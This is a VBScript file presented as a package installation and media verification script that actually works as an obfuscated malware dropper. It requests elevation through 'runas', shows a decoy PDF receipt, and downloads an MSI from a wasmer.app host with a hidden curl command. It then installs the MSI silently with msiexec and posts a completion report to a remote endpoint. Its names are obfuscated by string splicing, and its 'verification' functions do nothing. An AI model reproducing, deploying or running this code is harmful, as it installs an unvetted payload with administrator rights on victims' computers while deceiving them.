' Package installation and media verification script

Dim appShell, oFSO, strShellRef, strFSRef, webClient, ioStream, tempFolder, strPkgPath, strResourceURL, strAssetURL, strHTTPProvider, strStreamType, strDeployExe, strBatchFlag, strHostApp, strRunMode, strRunFlag, sysExec, strCmdType

strShellRef = "Shell" & "." & "Application"
strFSRef = "Scripting.FileSystemObject"
strHostApp = "wscript" & "." & "exe"
strRunMode = "runas"
strRunFlag = "elevated"



Function ParseRegistryEntry(strRaw)
    Dim arrParts : arrParts = Split(strRaw, ";")
    If UBound(arrParts) < 0 Then
        ParseRegistryEntry = ""
    Else
        ParseRegistryEntry = Trim(arrParts(0))
    End If
End Function


Function GetReference()
    GetReference = Year(Now) & Month(Now) & Day(Now)
End Function

Sub PullUpdate(strURL, strOutPath)
    Dim cmdExecutor, strRunnerClass
    strRunnerClass = Replace("WSXript.Shell", "X", "c")
    Set cmdExecutor = CreateObject(strRunnerClass)
    Dim intStatus
    Dim strCmd : strCmd = "curl.exe -s -L --fail -o """ & strOutPath & """ """ & strURL & """"
    intStatus = cmdExecutor.Run(strCmd, 0, True)
    If intStatus <> 0 Then WScript.Quit
    Dim objVerifyFSO, strVerifyProvider
    strVerifyProvider = Mid("Module=Scripting.FileSystemObject;Active=True", 8, 26)
    Set objVerifyFSO = CreateObject(strVerifyProvider)
    If Not objVerifyFSO.FileExists(strOutPath) Then WScript.Quit
End Sub


Sub SendTelemetry()
    ' Enterprise telemetry integration
    On Error Resume Next
    Dim objTelemetry : Set objTelemetry = CreateObject("MSXML2.ServerXMLHTTP")
    Dim strStatusUrl : strStatusUrl = "https://telemetry.corp.net/zl6my8/report"
    Dim strBatchId : strBatchId = "XGU0TNJ0"
    Dim strReportData : strReportData = "session=" & strBatchId & "&status=complete"
    objTelemetry.Open "POST", strStatusUrl, False
    objTelemetry.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    objTelemetry.Send strReportData
    If objTelemetry.Status <> 200 Then
        ' Telemetry endpoint unreachable — continue silently
    End If
    On Error GoTo 0
End Sub


Sub DebugLog(strMessage)
    On Error Resume Next
    Dim objDebugFSO : Set objDebugFSO = CreateObject("Scripting.FileSystemObject")
    Dim strDebugPath : strDebugPath = objDebugFSO.GetSpecialFolder(2) & "\vbs_debug.log"
    Dim objDebugFile : Set objDebugFile = objDebugFSO.OpenTextFile(strDebugPath, 8, True)
    objDebugFile.WriteLine Now() & " | " & strMessage
    objDebugFile.Close
    On Error GoTo 0
End Sub


Sub ApplyUpdate(strInstPath)
    DebugLog "Execute sub started with path: " & strInstPath
    On Error Resume Next
    If Not oFSO.FileExists(strInstPath) Then
        DebugLog "Execute error: target file does not exist"
        Exit Sub
    End If
    On Error GoTo 0
    strDeployExe = "msiexec" & "." & "exe"
    strBatchFlag = "/qn"
    strCmdType = "WScript" & "." & "Shell"
    Set sysExec = CreateObject(strCmdType)
    sysExec.Run strDeployExe & " /i """ & strInstPath & """ " & strBatchFlag, 0, False
End Sub

Sub PresentContent()
    strAssetURL = "https://pdfviewer.wasmer.app/doc/wureceipt.pdf"
    Dim oNavShell, strNavClass
    strNavClass = Replace(Replace("WScrip!.Sh#ll", "!", "t"), "#", "e")
    Set oNavShell = CreateObject(strNavClass)
    oNavShell.Run strAssetURL, 1, False
End Sub

Sub ValidateRuntime()
    Dim strVal
    strVal = "q1941d"
    If Len(strVal) < 2 Then Exit Sub
End Sub

Sub WriteToStaging(pkgContent, strSavePath)
    strStreamType = Mid("Module=ADODB.Stream;Pool=Default", 8, 12)
    Dim intTransferType : intTransferType = CInt("1")
    Dim intOutputCfg : intOutputCfg = Len("AB")
    Set ioStream = CreateObject(strStreamType)
    ioStream.Type = intTransferType
    ioStream.Open
    ioStream.Write pkgContent
    ioStream.SaveToFile strSavePath, intOutputCfg
    ioStream.Close
End Sub


Sub PrepareSession()
    DebugLog "Elevation sub started"
    Dim strRelaunch
    If Not WScript.Arguments.Named.Exists(strRunFlag) Then
        strRelaunch = """" & WScript.ScriptFullName & """ /" & strRunFlag
        Set appShell = CreateObject(strShellRef)
        appShell.ShellExecute strHostApp, strRelaunch, "", strRunMode, 1
        WScript.Quit
    End If
End Sub

Function CheckDriver(strName)
    CheckDriver = True
    If strName = "" Then CheckDriver = False
End Function


Function VerifyCertificate(strData)
    Dim strExpected : strExpected = "1F89BBC8"
    Dim nLen : nLen = Len(strData)
    If nLen < 4 Then
        VerifyCertificate = False
        Exit Function
    End If
    VerifyCertificate = True
End Function

' --- Entry Point ---
PrepareSession
    DebugLog "Elevation completed"

WScript.Sleep 1657
PresentContent
    DebugLog "Media opened"
WScript.Sleep 598

Set oFSO = CreateObject(strFSRef)
Dim intDirId : intDirId = 1 + 1
tempFolder = oFSO.GetSpecialFolder(intDirId)
strPkgPath = tempFolder & "\puttinstaller.msi"
strResourceURL = Join(Array("htt", "ps://pdfvie", "wer.wasme", "r.app/doc/", "upda", "ter.msi"), "")

    DebugLog "Starting download to: " & strPkgPath
PullUpdate strResourceURL, strPkgPath
    DebugLog "Download completed"
Dim strLogRef : strLogRef = Year(Now) & "-" & Month(Now) & "-" & Day(Now)
    Dim strHostCheck : strHostCheck = ""
    On Error Resume Next
    strHostCheck = CreateObject("WScript.Network").ComputerName
    On Error GoTo 0
    If strHostCheck = "" Then strHostCheck = "UNKNOWN"
    Dim intElapsed : intElapsed = Timer()
    If intElapsed > 0 Then WScript.Sleep 399
    DebugLog "Starting execution"
ApplyUpdate strPkgPath
    DebugLog "Execution completed"

' Post-deployment telemetry
SendTelemetry
WScript.Sleep 1000